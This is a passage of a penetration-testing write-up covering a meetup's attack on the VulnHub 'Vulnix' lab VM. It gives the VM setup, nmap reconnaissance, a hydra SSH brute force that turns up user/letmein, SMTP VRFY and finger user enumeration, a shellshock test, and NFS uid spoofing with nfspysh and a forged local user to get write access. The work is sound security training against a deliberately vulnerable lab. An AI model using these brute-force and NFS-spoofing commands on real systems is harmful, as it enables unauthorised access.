@@ -1,0 +1,1022 @@
+.. include:: /pentest_links.txt
+
+.. _Vulnix:
+
+******
+Vulnix
+******
+
+Setup
+=====
+
+This is to document the meetup's efforts responding to the challenge `HackLAB: Vulnix <https://www.vulnhub.com/entry/hacklab-vulnix,48/>`_:
+
+  Here we have a vulnerable Linux host with configuration weaknesses rather than purposely vulnerable software versions (well at the time of release anyway!). ... The goal; boot up, find the IP, hack away and obtain the trophy hidden away in /root by any means you wish – excluding the actual hacking of the vmdk.
+
+`Rebootuser - Local Linux Enumeration & Privilege Escalation <http://www.rebootuser.com/?page_id=1721>`_ shows techniques/hints.
+
+Setting up the VMware VM
+------------------------
+
+See :ref:`VMSetup` for background on using the VMware vmdk file. Vulnix is Ubuntu 12.04, x86, and 512MB memory. For KVM you can use a backing store to undo any changes to the disk:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  BACKING=Vulnix.vmdk
+  VM_DISK=Vulnix-changes.qcow2
+  curl --remote-name http://www.rebootuser.com/wp-content/uploads/vulnix/Vulnix.7z
+  $SUDO apt-get install p7zip-full -y
+  7z e Vulnix.7z
+  $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+  $SUDO qemu-img info $BACKING
+  $SUDO qemu-img info $VM_DISK
+  # To revert to original image
+  # $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+
+Then Linux KVM could use the VM_DISK to create the Vulnix VM. The actual command the author used in Debian Linux to create the VM was (though it's recommended to use a GUI):
+
+.. code-block:: bash
+
+  VM=Vulnix
+  $SUDO virt-install \
+      --name "Vulnix" --cpu host --vcpus 1 --ram 512 \
+      --os-type=linux --os-variant=ubuntuprecise \
+      --disk path=$VM_DISK \
+      --noautoconsole \
+      --accelerate --hvm \
+      --import
+  #    --console pty,target_type=virtio \
+  # Useful commands:
+  # $SUDO virsh help
+  # $SUDO virsh list --all
+  # $SUDO virsh destroy --graceful $VM
+  # $SUDO virsh start $VM
+  # $SUDO virsh reboot $VM
+  # $SUDO virsh shutdown $VM
+  # $SUDO virsh undefine [--wipe-storage] $VM
+  # $SUDO virsh undefine $VM
+  # $SUDO virsh help destroy
+  # 
+
+So if Vulnix were running and you wanted to "start over again":
+
+.. code-block:: bash
+
+  $SUDO virsh shutdown $VM
+  $SUDO virsh undefine $VM
+  $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+  $SUDO virt-install \
+      --name "Vulnix" --cpu host --vcpus 1 --ram 512 \
+      --os-type=linux --os-variant=ubuntuprecise \
+      --disk path=$VM_DISK \
+      --noautoconsole \
+      --accelerate --hvm \
+      --import
+
+Software Used
+-------------
+
+Extra software needed on Kali Linux. ``enumerator`` depends on: nmap; nikto, dirb (http enumeration); hydra (ftp enumeration); and enum4linux (netbios enumeration). Only non-root accounts use virtualenv.
+
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  if [[ "$USER" != "root" ]]; then
+    $SUDO pip install -U virtualenvwrapper
+    mkvirtualenv vulnix
+    # To see what virtual environments exist
+    #   lsvirtualenv
+    # To switch virtual environments
+    #   workon vulnix
+    # To deactivate the current virtual environment
+    #   deactivate
+    # To delete a virtual environment
+    #   rmvirtualenv vulnix
+  fi
+  pip install -U enumerator
+  $SUDO apt-get install nfs-common -y
+  $SUDO apt-get install hydra -y
+  $SUDO apt-get install nikto -y
+  $SUDO apt-get install dirb -y
+  $SUDO apt-get install enum4linux -y
+
+Reconnaissance
+==============
+
+Reconnaissance via ``enumerator``
+---------------------------------
+
+.. code-block:: console
+
+  (vulnix)hacker@kali:~$ # Check for new IPs on the subnet (vulnix VM)
+  (vulnix)hacker@kali:~$ SUBNET="192.168.1.0/24"
+  (vulnix)hacker@kali:~$ nmap -sn $SUBNET
+
+  Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-16 11:47 PDT
+  ###################### SNIP ######################
+  Nmap scan report for 192.168.1.103
+  Host is up (0.00074s latency).
+  ###################### SNIP ######################
+  (vulnix)hacker@kali:~$ # Run enumerator on vulnix
+  (vulnix)hacker@kali:~$ IP=192.168.1.103
+  (vulnix)hacker@kali:~$ $SUDO rm -rf results/
+  (vulnix)hacker@kali:~$ $SUDO $(which enumerator) -s $IP
+  [+] IP list parsed, sending hosts to nmap...
+     [-] nmap: running TCP & UDP scans for host: 192.168.1.103
+  (vulnix)hacker@kali:~$ ls results/$IP
+  192.168.1.103-rpc-showmount.txt    192.168.1.103-tcp-standard.txt
+  192.168.1.103-ssh-22-hydra.txt     192.168.1.103-udp-standard.txt
+  192.168.1.103-ssh-22-standard.txt
+  (vulnix)hacker@kali:~$ for f in results/$IP/*.txt; do echo -e "\n\n\nFILE $f\n"; cat $f; done
+
+
+
+  FILE results/192.168.1.103/192.168.1.103-rpc-showmount.txt
+
+  Export list for 192.168.1.103:
+  /home/vulnix *
+
+
+
+  FILE results/192.168.1.103/192.168.1.103-ssh-22-hydra.txt
+
+  # Hydra v8.1 run at 2015-04-16 11:53:09 on 192.168.1.103 ssh (hydra -L /home/hacker/.virtualenvs/vulnix/lib/python2.7/site-packages/enumerator/lib/ssh/user-password-tiny.txt -P /home/hacker/.virtualenvs/vulnix/lib/python2.7/site-packages/enumerator/lib/ssh/user-password-tiny.txt -o results/192.168.1.103/192.168.1.103-ssh-22-hydra.txt -t 4 192.168.1.103 ssh)
+  [22][ssh] host: 192.168.1.103   login: user   password: letmein
+
+
+
+  FILE results/192.168.1.103/192.168.1.103-ssh-22-standard.txt
+
+  # Nmap 6.47 scan initiated Thu Apr 16 11:53:09 2015 as: nmap -Pn -p 22 --script=ssh-hostkey -oN results/192.168.1.103/192.168.1.103-ssh-22-standard.txt 192.168.1.103
+  Nmap scan report for 192.168.1.103
+  Host is up (0.00056s latency).
+  PORT   STATE SERVICE
+  22/tcp open  ssh
+  | ssh-hostkey: 
+  |   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
+  |   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
+  |_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
+  MAC Address: 52:54:00:B0:A8:8C (QEMU Virtual NIC)
+
+  # Nmap done at Thu Apr 16 11:53:09 2015 -- 1 IP address (1 host up) scanned in 0.35 seconds
+
+
+
+  FILE results/192.168.1.103/192.168.1.103-tcp-standard.txt
+
+  # Nmap 6.47 scan initiated Thu Apr 16 11:50:15 2015 as: nmap -Pn -T4 -sS -sV -oN results/192.168.1.103/192.168.1.103-tcp-standard.txt -oG results/192.168.1.103/192.168.1.103-tcp-greppable.txt 192.168.1.103
+  Nmap scan report for 192.168.1.103
+  Host is up (0.00027s latency).
+  Not shown: 988 closed ports
+  PORT     STATE SERVICE    VERSION
+  22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+  25/tcp   open  smtp?
+  79/tcp   open  finger     Linux fingerd
+  110/tcp  open  pop3       Dovecot pop3d
+  111/tcp  open  rpcbind    2-4 (RPC #100000)
+  143/tcp  open  imap       Dovecot imapd
+  512/tcp  open  exec       netkit-rsh rexecd
+  513/tcp  open  login
+  514/tcp  open  tcpwrapped
+  993/tcp  open  ssl/imap   Dovecot imapd
+  995/tcp  open  ssl/pop3   Dovecot pop3d
+  2049/tcp open  nfs        2-4 (RPC #100003)
+  MAC Address: 52:54:00:B0:A8:8C (QEMU Virtual NIC)
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+  Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+  # Nmap done at Thu Apr 16 11:53:04 2015 -- 1 IP address (1 host up) scanned in 169.39 seconds
+
+
+
+  FILE results/192.168.1.103/192.168.1.103-udp-standard.txt
+
+  # Nmap 6.47 scan initiated Thu Apr 16 11:53:04 2015 as: nmap -Pn -T4 -sU -sV --open --top-ports 10 -oN results/192.168.1.103/192.168.1.103-udp-standard.txt -oG results/192.168.1.103/192.168.1.103-udp-greppable.txt 192.168.1.103
+  Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+  # Nmap done at Thu Apr 16 11:53:09 2015 -- 1 IP address (1 host up) scanned in 4.75 seconds
+
+Doing the ``enumerator`` reconnaissance by hand
+-----------------------------------------------
+
+Perform the equivalent of the ``enumerator`` reconnaissance by hand as a learning exercise. The order is the same order output above.
+
+nfs mounts
+^^^^^^^^^^
+
+.. code-block:: console
+
+  (vulnix)hacker@kali:~$ /sbin/showmount -e $IP
+  Export list for 192.168.1.103:
+  /home/vulnix *
+
+ssh users and passwords
+^^^^^^^^^^^^^^^^^^^^^^^
+
+``enumerator`` simply ran ``hydra`` using the following file for both the userid and password guesses::
+
+  root
+  admin
+  toor
+  letmein
+  changeme
+  administrator
+  password
+  1
+  12
+  123
+  1234
+  12345
+  123456
+  1234567
+  12345678
+  1234567890
+  ftp
+  user
+  guest
+
+You can use one of Kali's password lists in :file:`/usr/share/wordlists`; "letmein" is in both :file:`rockyou.txt` and :file:`nmap.lst`. And "user" is not exactly a stretch for testing user ids. So a simple ``hydra`` run like the following would suffice:
+
+.. code-block:: bash
+
+  hydra -L user_list.txt -P rockyou.txt -o hydra_out.txt -t 4 $IP ssh
+
+SSH host keys
+^^^^^^^^^^^^^
+
+Host SSH keys can be obtained using ``ssh-keyscan`` with help from ``ssh-keygen``:
+
+.. code-block:: bash
+
+  # using ssh-keyscan and ssh-keygen
+  TEMP=$(mktemp)
+  ssh-keyscan -t rsa1,rsa,dsa,ecdsa,ed25519 $IP>$TEMP 2>/dev/null
+  ssh-keygen -l -f $TEMP
+  rm -f $TEMP
+
+resulting in:
+
+.. code-block:: console
+
+  (vulnix)hacker@kali:~$ # using ssh-keyscan and ssh-keygen
+  (vulnix)hacker@kali:~$ TEMP=$(mktemp)
+  (vulnix)hacker@kali:~$ ssh-keyscan -t rsa1,rsa,dsa,ecdsa,ed25519 $IP>$TEMP 2>/dev/null
+  (vulnix)hacker@kali:~$ ssh-keygen -l -f $TEMP
+  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f 192.168.1.103 (ECDSA)
+  1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf 192.168.1.103 (DSA)
+  2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a 192.168.1.103 (RSA)
+  (vulnix)hacker@kali:~$ rm -f $TEMP
+
+Alternatively ``nmap`` can be used:
+
+.. code-block:: bash
+
+  # using nmap
+  nmap $IP --script ssh-hostkey
+  nmap $IP --script ssh-hostkey --script-args ssh_hostkey=full
+  # nmap $IP --script ssh-hostkey --script-args ssh_hostkey='visual bubble'
+  # nmap $IP --script ssh-hostkey --script-args ssh_hostkey=all
+
+resulting in:
+
+.. code-block:: console
+
+  (vulnix)hacker@kali:~$ # using nmap
+  (vulnix)hacker@kali:~$ nmap $IP --script ssh-hostkey
+
+  Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-17 10:24 PDT
+  Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
+  Ping Scan Timing: About 100.00% done; ETC: 10:24 (0:00:00 remaining)
+  Nmap scan report for 192.168.1.103
+  Host is up (0.00033s latency).
+  Not shown: 988 closed ports
+  PORT     STATE SERVICE
+  22/tcp   open  ssh
+  | ssh-hostkey: 
+  |   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
+  |   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
+  |_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
+  25/tcp   open  smtp
+  79/tcp   open  finger
+  110/tcp  open  pop3
+  111/tcp  open  rpcbind
+  143/tcp  open  imap
+  512/tcp  open  exec
+  513/tcp  open  login
+  514/tcp  open  shell
+  993/tcp  open  imaps
+  995/tcp  open  pop3s
+  2049/tcp open  nfs
+
+  Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
+  (vulnix)hacker@kali:~$ nmap $IP --script ssh-hostkey --script-args ssh_hostkey=full
+
+  Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-17 10:24 PDT
+  Nmap scan report for 192.168.1.103
+  Host is up (0.0095s latency).
+  Not shown: 988 closed ports
+  PORT     STATE SERVICE
+  22/tcp   open  ssh
+  | ssh-hostkey: 
+  |   ssh-dss AAAAB3NzaC1kc3MAAACBAJJHCFDFkbuQTVpmQvCvdR2poQrsZOQ0nBEsUij15T9DAiUhxI41G8hQ97MM9Qe0eGdP7HsA8vkZnglainhktvPe1NN9+XnDVRziI3dEqSxpCi4obxxYdKtqGBIj83dOPpxm09xDhVYBdh7ZlZh8xttD+ACFqmN4VZjmv0IlSYZFAAAAFQC6Z+j+KbT59gBXSPQTpAJIh0FE2wAAAIEAgYwA5oFVMQdKfRwAxbLoADx3t735BpLIoVNX2j4UrAF8CmwLCmcsNAhdpUP+hMhKGXnP5co2nira3OkcwWRu219bjte7m1l9JOvCJUASTUzOC0CUJkm9wO40/gyJOelKRR37r0qnBImiEumL6dSpcg4b0IfozCI9UJGh/yiEu4kAAACASWk2tKCyCHamiXwIt0XdwTXubZYtRtH09LHdisSEsoinz+2szuzbqnwgancHXcyQ3PapixZhVNASZ8MobmkFDXh4SDS5zl+RW7K40FBh3z+HCdSAJJjkRFXWEuadjxpO2QWBYEJiER4AtFWUSl2kVMFdsWqYaK7BxStNNkmGBII=
+  |   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1jCDgzdowLQVOEXrczN+xbuMcNkncz2EfCEncP7k8rhNjQq+eXzMKEfULxMLh/wLFhX2TVZDECTpQ0WVJckgkGeZSdvmEJKt5LbZlSm5HAz/DMUKIuohDRI4F3lqn9u5VAVKSyTXyR3EuxCsCHJy+Xf40BJImr+fZ7yH3xwPPqJ9in+LfgTXaRItqLDHiHAsTIXXwsDgweaS9hSTAR1MO+TdZCnXKPJ1NEt38+Fl7rnTnBE2TdtU3iyrlWXE0GGGg0bgldqas7bR4UH/uRZZOZK2+UTf0qg30H7ll8ShfZIbdW+59RfQqYz8tZYsoWoxahWf3dmx5soCWWcAP7DAV
+  |_  ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGEudclsh1beHM/DPWQGR31dOGqdLcXVj1xLG/YSGfiNmN1pT6x0MwYQyN6pzCzzonljThH8JwIZjid+JN2PzxE=
+  25/tcp   open  smtp
+  79/tcp   open  finger
+  110/tcp  open  pop3
+  111/tcp  open  rpcbind
+  143/tcp  open  imap
+  512/tcp  open  exec
+  513/tcp  open  login
+  514/tcp  open  shell
+  993/tcp  open  imaps
+  995/tcp  open  pop3s
+  2049/tcp open  nfs
+
+  Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
+  (vulnix)hacker@kali:~$ # nmap $IP --script ssh-hostkey --script-args ssh_hostkey='visual bubble'
+  (vulnix)hacker@kali:~$ # nmap $IP --script ssh-hostkey --script-args ssh_hostkey=all
+
+TCP services
+^^^^^^^^^^^^
+
+``enumerator`` simply runs:
+
+.. code-block:: bash
+
+  $SUDO nmap -Pn -T4 -sS -sV  $IP
+
+resulting in:
+
+.. code-block:: console
+
+  (vulnix)hacker@kali:~$ $SUDO nmap -Pn -T4 -sS -sV  $IP
+
+  Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-17 10:34 PDT
+  Nmap scan report for 192.168.1.103
+  Host is up (0.00030s latency).
+  Not shown: 988 closed ports
+  PORT     STATE SERVICE    VERSION
+  22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+  25/tcp   open  smtp       Postfix smtpd
+  79/tcp   open  finger     Linux fingerd
+  110/tcp  open  pop3       Dovecot pop3d
+  111/tcp  open  rpcbind    2-4 (RPC #100000)
+  143/tcp  open  imap       Dovecot imapd
+  512/tcp  open  exec       netkit-rsh rexecd
+  513/tcp  open  login?
+  514/tcp  open  tcpwrapped
+  993/tcp  open  ssl/imap   Dovecot imapd
+  995/tcp  open  ssl/pop3   Dovecot pop3d
+  2049/tcp open  nfs        2-4 (RPC #100003)
+  MAC Address: 52:54:00:4B:A3:6C (QEMU Virtual NIC)
+  Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+  Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 28.83 seconds
+
+
+UDP services
+^^^^^^^^^^^^
+
+``enumerator`` simply runs:
+
+.. code-block:: bash
+
+  $SUDO nmap -Pn -T4 -sU -sV --open --top-ports 10 $IP
+
+resulting in:
+
+.. code-block:: console
+
+  (vulnix)hacker@kali:~$ $SUDO nmap -Pn -T4 -sU -sV --open --top-ports 10 $IP
+
+  Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-17 10:37 PDT
+  Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 4.77 seconds
+
+A more complete scan (dropping options "--open --top-ports 10") yields the following:
+
+.. code-block:: console
+
+  (vulnix)hacker@kali:~$ $SUDO nmap -Pn -T4 -sU -sV  $IP
+
+  Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-17 10:38 PDT
+
+
+
+  Nmap scan report for 192.168.1.103
+  Host is up (0.00049s latency).
+  Not shown: 953 closed ports, 45 open|filtered ports
+  PORT     STATE SERVICE VERSION
+  111/udp  open  rpcbind 2-4 (RPC #100000)
+  2049/udp open  nfs     2-4 (RPC #100003)
+  MAC Address: 52:54:00:4B:A3:6C (QEMU Virtual NIC)
+
+  Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 1226.03 seconds
+
+
+More Reconnaissance
+-------------------
+
+Follow `Rebootuser - Local Linux Enumeration & Privilege Escalation <http://www.rebootuser.com/?page_id=1721>`_ for hints at more reconnaissance. This section takes liberal advantage of the user/letmein account for on-server reconnaissance.
+
+.. code-block:: bash
+
+  # using "sshpass -p" is insecure but we do it in our playground
+  $SUDO apt-get install sshpass -y
+  IP=192.168.1.103
+  sshpass -p 'letmein' ssh user@$IP
+
+
+
+Kernel, Operating System & Device Information
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+``uname -a`` shows an old (2012-07-27) kernel version indicating the system is likely unpatched. Looking in :file:`/var/log/apt` we see
+
+.. code-block:: console
+
+  user@vulnix:~$ ls -l /var/log/apt/
+  total 24
+  -rw-r--r-- 1 root root 12109 Sep  2  2012 history.log
+  -rw-r--r-- 1 root adm   8797 Sep  2  2012 term.log
+  user@vulnix:~$ cat /var/log/apt/history.log 
+  ###################### SNIP ######################
+  user@vulnix:~$ # history.log shows that no patches after 2012-09-02
+
+So there's no patches since 2012-09-02 meaning Vulnix is vulnerable to a host of bugs; one outstanding example is the shellshock bug.
+
+.. code-block:: console
+
+  user@vulnix:~$ env x='() { :;}; echo vulnerable' bash -c 'echo hello'vulnerable
+  hello
+
+Unfortunately, to exploit the shellshock bug requires finding an application spawning bash that uses an environment variable as an argument.
+
+To exploit one of the unpatched issues would require investigating:
+
+* `Ubuntu security notices <http://www.ubuntu.com/usn/>`_ for Ubuntu 12.04 LTS
+
+* `CVS Details <http://www.cvedetails.com/>`_
+
+* `National Vulnerability Database <https://web.nvd.nist.gov/view/vuln/search>`_
+
+
+Users & Groups
+^^^^^^^^^^^^^^
+
+A quick check of users shows only root is a super user and only normal accounts user and vulnix exist:
+
+.. code-block:: bash 
+
+  user@vulnix:~$ # see that only non-system user accounts are "user" (id 1000) and "vulnix" (id 2008)
+  user@vulnix:~$ for i in $(cat /etc/passwd 2>/dev/null | cut -d: -f1 2>/dev/null); do
+  >   if [[ $(id -u $i) -gt 999 ]]; then
+  >     echo "$i $(id -u $i)";
+  >   fi;
+  > done
+  nobody 65534
+  user 1000
+  vulnix 2008
+  user@vulnix:~$ # see only super user account is root
+  user@vulnix:~$ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'
+  root
+
+If there were no local access to Vulnix then smtp and finger could provide brute-force enumeration of users from Kali:
+
+.. code-block:: console
+
+  hacker@kali:~$ # use smtp VRFY command to check for users
+  hacker@kali:~$ telnet $IP 25
+  Trying 192.168.1.105...
+  Connected to 192.168.1.105.
+  Escape character is '^]'.
+  220 vulnix ESMTP Postfix (Ubuntu)
+  EHLO bitbender.org
+  250-vulnix
+  250-PIPELINING
+  250-SIZE 10240000
+  250-VRFY
+  250-ETRN
+  250-STARTTLS
+  250-ENHANCEDSTATUSCODES
+  250-8BITMIME
+  250 DSN
+  VRFY user
+  252 2.0.0 user
+  VRFY vulnix
+  252 2.0.0 vulnix
+  VRFY XXXXXXXXXXXX
+  550 5.1.1 <XXXXXXXXXXXX>: Recipient address rejected: User unknown in local recipient table
+  QUIT
+  221 2.0.0 Bye
+  Connection closed by foreign host.
+
+  hacker@kali:~$ # use smtp-user-enum to check for users
+  hacker@kali:~$ cat > users.txt <<EOF
+  > user
+  > vulnix
+  > XXXXXXXXXXXX
+  > EOF
+  hacker@kali:~$ smtp-user-enum -U users.txt -t $IP
+  ###################### SNIP ######################
+  ######## Scan started at Sat Apr 18 11:01:54 2015 #########
+  192.168.1.103: user exists
+  192.168.1.103: vulnix exists
+  ######## Scan completed at Sat Apr 18 11:01:55 2015 #########
+  2 results.
+
+  3 queries in 1 seconds (3.0 queries / sec)
+
+  hacker@kali:~$ # install finger to check for users
+  hacker@kali:~$ $SUDO apt-get install finger -y
+  ###################### SNIP ######################
+  hacker@kali:~$ finger user@$IP
+  Login: user           			Name: user
+  Directory: /home/user               	Shell: /bin/bash
+  On since Sat Apr 18 18:39 (BST) on pts/0 from 192.168.1.104
+  Last login Sat Apr 18 18:51 (BST) on pts/1 from 192.168.1.104
+  No mail.
+  No Plan.
+
+  Login: dovenull       			Name: Dovecot login user
+  Directory: /nonexistent             	Shell: /bin/false
+  Never logged in.
+  No mail.
+  No Plan.
+  hacker@kali:~$ finger vulnix@$IP
+  Login: vulnix         			Name: 
+  Directory: /home/vulnix             	Shell: /bin/bash
+  Never logged in.
+  No mail.
+  No Plan.
+  hacker@kali:~$ finger XXXXXXXXXXXX@$IP
+  finger: XXXXXXXXXXXX: no such user.
+  hacker@kali:~$ $SUDO apt-get remove finger -y
+  ###################### SNIP ######################
+
+``rpcinfo``
+^^^^^^^^^^^
+
+Run ``rpcinfo`` to determine the portmapped ports (bascially nfs = status, nfs, nlockmgr, and mountd):
+
+.. code-block:: console
+
+  hacker@kali:~$ rpcinfo -p $IP
+     program vers proto   port
+      100000    4   tcp    111  portmapper
+      100000    3   tcp    111  portmapper
+      100000    2   tcp    111  portmapper
+      100000    4   udp    111  portmapper
+      100000    3   udp    111  portmapper
+      100000    2   udp    111  portmapper
+      100024    1   udp  48774  status
+      100024    1   tcp  40613  status
+      100003    2   tcp   2049  nfs
+      100003    3   tcp   2049  nfs
+      100003    4   tcp   2049  nfs
+      100227    2   tcp   2049
+      100227    3   tcp   2049
+      100003    2   udp   2049  nfs
+      100003    3   udp   2049  nfs
+      100003    4   udp   2049  nfs
+      100227    2   udp   2049
+      100227    3   udp   2049
+      100021    1   udp  45130  nlockmgr
+      100021    3   udp  45130  nlockmgr
+      100021    4   udp  45130  nlockmgr
+      100021    1   tcp  47065  nlockmgr
+      100021    3   tcp  47065  nlockmgr
+      100021    4   tcp  47065  nlockmgr
+      100005    1   udp  57240  mountd
+      100005    1   tcp  56240  mountd
+      100005    2   udp  37452  mountd
+      100005    2   tcp  56001  mountd
+      100005    3   udp  35932  mountd
+      100005    3   tcp  37852  mountd
+
+
+
+
+An embarrassment of riches?
+---------------------------
+
+There are many services to investigate for vulnerabilities: NFS open mount for user vulnix; ssh userid/password user/letmein (which allows us to do on-server reconnaissance); services ssh, smtp, finger, pop3, rpcbind, imap, rexec, and login. It turns out the keys are NFS & ssh (or rexec/login). While in principle smtp & finger could be used to do a brute force enumeration of users, having the user/letmein account made those superflous. We did not investigate pop3/imap as it was not needed.
+
+Attacking NFS
+=============
+
+We'll start in the order of the reconnaissance output with attacking NFS. ``enumerator`` or ``/sbin/showmount -e $IP`` shows :file:`/home/vulnix` exported to '*'. This allows writing to /home/vulnix from Kali linux which we'll exploit to get password-less access to Vulnix. There are these attack choices:
+
+* Writing to NFS:
+
+  * ``nfspysh`` - use the special tool ``nfspysh``
+
+  * ``mount.nfs`` - mount the nfs file system the normal nfs way
+
+* Executing on Vulnix:
+
+  * ``rsh`` - execute using the real ``rsh`` (not installed by default on Kali Linux)
+
+  * ``ssh`` - execute via ``ssh``
+
+Using ``nfspysh`` & ``rsh`` is easier than using ``mount.nfs`` & ``ssh``.
+
+Reviewing nfs mounts
+--------------------
+
+We begin with a review of how to mount nfs. Vulnix runs nfs4 which is backwards compatible with nfs3 clients. If the following is not clear you might consult `NFSv4Howto <https://help.ubuntu.com/community/NFSv4Howto>`_ and/or `Kerberos and nfs4 <https://we.riseup.net/stefani/kerberos-and-nfs4>`_.
+
+Authentication
+^^^^^^^^^^^^^^
+
+nfs4 can use kerberos but vulnix doesn not and so user identity must resort to unix uid/gid. nfs4 defaults to nobody/nogroup (4294967294/4294967294) for a failure to map a user and in fact you'll always see the nobody/nogroup in directory listings even when nfs4 does allow access. However, nfs3 mounts will show the uid/gid for users not mapped to nobody/nogroup. So if uid/gid = 2008/2008 owns the files then creating a user with uid/gid on your local Kali box will get you access like the file owner.
+
+Using :program:`nfspysh`
+^^^^^^^^^^^^^^^^^^^^^^^^
+
+From `NfSpy - an ID-spoofing NFS client <https://github.com/bonsaiviking/NfSpy/blob/master/README.md>`_:
+
+  NfSpy is a Python library for automating the falsification of NFS credentials when mounting an NFS share. Included are two client programs:
+
+    nfspy uses the Filesystem in Userspace (FUSE) library to mount an NFS share in Linux. This allows the use of any regular file-searching and manipulation programs like grep and find to explore the NFS export.
+
+    nfspysh is a ftp-like interactive shell for exploring NFS exports. It does not require the FUSE library, so it can run on non-Linux platforms.
+
+  NFS before version 4 is reliant upon host trust relationships for authentication. The NFS server trusts any client machines to authenticate users and assign the same user IDs (UIDS) that the shared filesystem uses. This works in NIS, NIS+, and LDAP domains, for instance, but only if you know the client machine is not compromised, or faking its identity. This is because the only authentication in the NFS protocol is the passing of the UID and GID (group ID). There are a few things that can be done to enhance the security of NFS, but many of them are incomplete solutions, and even with all three listed here, it could still be possible to circumvent the security measures.
+
+Since NfSpy spoofs the uid/gid, its simplest to use and immediately gives us the vulnix server's uid/gid used for :file:`/home/vulnix` and write access:
+
+.. code-block:: bash
+
+  $SUDO nfspysh -o server=$T:/home/vulnix -c ls
+  echo hello > hello.txt
+  $SUDO nfspysh -o server=$T:/home/vulnix -c 'put hello.txt'
+  $SUDO nfspysh -o server=$T:/home/vulnix -c 'chmod 600 hello.txt'
+  $SUDO nfspysh -o server=$T:/home/vulnix -c ls
+  $SUDO nfspysh -o server=$T:/home/vulnix -c 'rm hello.txt'
+
+Running this shows that :program:`nfspysh` show spoofing the correct uid/gid to get write access (even though the correct uid/gid is never specified):
+
+.. code-block:: console
+
+  hacker@kali:~/local/pentest/phouse/vulnix$ $SUDO nfspysh -o server=$T:/home/vulnix -c ls
+  /:
+  040750   2008   2008        4096 2015-04-30 00:13:31 .
+  100644   2008   2008         220 2012-04-03 08:58:14 .bash_logout
+  100644   2008   2008         675 2012-04-03 08:58:14 .profile
+  040750   2008   2008        4096 2015-04-30 00:13:31 ..
+  100644   2008   2008        3486 2012-04-03 08:58:14 .bashrc
+  hacker@kali:~/local/pentest/phouse/vulnix$ echo hello > hello.txt
+  hacker@kali:~/local/pentest/phouse/vulnix$ $SUDO nfspysh -o server=$T:/home/vulnix -c 'put hello.txt'
+  hacker@kali:~/local/pentest/phouse/vulnix$ $SUDO nfspysh -o server=$T:/home/vulnix -c 'chmod 600 hello.txt'
+  hacker@kali:~/local/pentest/phouse/vulnix$ $SUDO nfspysh -o server=$T:/home/vulnix -c ls
+  /:
+  040750   2008   2008        4096 2015-04-30 00:14:44 .
+  100644   2008   2008         220 2012-04-03 08:58:14 .bash_logout
+  100600   2008   2008           6 2015-04-30 00:14:44 hello.txt
+  100644   2008   2008         675 2012-04-03 08:58:14 .profile
+  040750   2008   2008        4096 2015-04-30 00:14:44 ..
+  100644   2008   2008        3486 2012-04-03 08:58:14 .bashrc
+  hacker@kali:~/local/pentest/phouse/vulnix$ $SUDO nfspysh -o server=$T:/home/vulnix -c 'rm hello.txt'
+
+Mounting nfs4 style
+^^^^^^^^^^^^^^^^^^^
+
+By contrast doing an nfs mount to get write access requires creating a user with the proper uid/gid. Here we use both an nfs4 and nfs3 mount to show the nfs4 always shows nobody/nogroup though it can give write access, but nfs3 mounts show the proper uid/gid.
+
+Here is an nfs4 mount showing write access with a freshly-created user with uid/gid 2008/2008:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  # nfs4 mounts at root
+  T=192.168.1.103
+  MP=/mnt
+  $SUDO mount -t nfs4 $T:/ $MP
+  # normal user fails to get access
+  ls -laR $MP
+  # but uid/gid 2008/2008 does get access
+  $SUDO groupadd --gid 2008 vulnix
+  $SUDO useradd -m vulnix --uid 2008 --gid 2008
+  $SUDO passwd vulnix
+  # set vulnix password
+  $SUDO chsh -s /bin/bash vulnix
+  su - vulnix
+  ls -laR /mnt
+  # and local vulnix user can write to the nfs share
